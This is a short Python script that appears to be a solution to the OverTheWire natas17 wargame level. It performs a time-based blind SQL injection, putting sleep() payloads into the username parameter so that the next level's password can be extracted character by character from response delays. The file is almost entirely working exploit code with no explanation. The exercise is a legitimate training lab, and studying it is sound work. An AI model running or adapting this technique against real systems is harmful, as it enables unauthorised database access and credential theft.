#!/usr/bin/env python

import requests
import time

URL = 'http://natas17.natas.labs.overthewire.org/index.php'
USERNAME = 'natas17'
PASSWORD = 'xxxxxxxxxxxxxxxxxxxxxxxxxx'
KEY = ''
W = 2

CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
PRESENT = ''

ADDON = '?debug=true&username=natas18" and sleep('+str(W)+') and "a"="a'
start = time.time()
r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
stop = time.time()
if stop-start >= W:
    print("Username is natas18")

for i, l in enumerate(CHARS):
    ADDON = '?debug=true&username=natas18" and password like BINARY "%' + l +'%" and sleep('+str(W)+') and "a"="a'
    start = time.time()
    r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
    stop = time.time()
    if stop-start >= W:
        PRESENT += l
        print("Chars available: %s (%0.2f)" % (PRESENT, (stop-start)))

# Assume length of key the same as the other levels
for i in range(len(PASSWORD)):
    for c in PRESENT:
        ADDON = '?debug=true&username=natas18" and password like BINARY "' + KEY + c +'%" and sleep('+str(W)+') and "a"="a'
        start = time.time()
        r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
        stop = time.time()
        if stop-start >= W:
            KEY += c
            print("Key: %s (%0.2f)" % (KEY, (stop-start)))
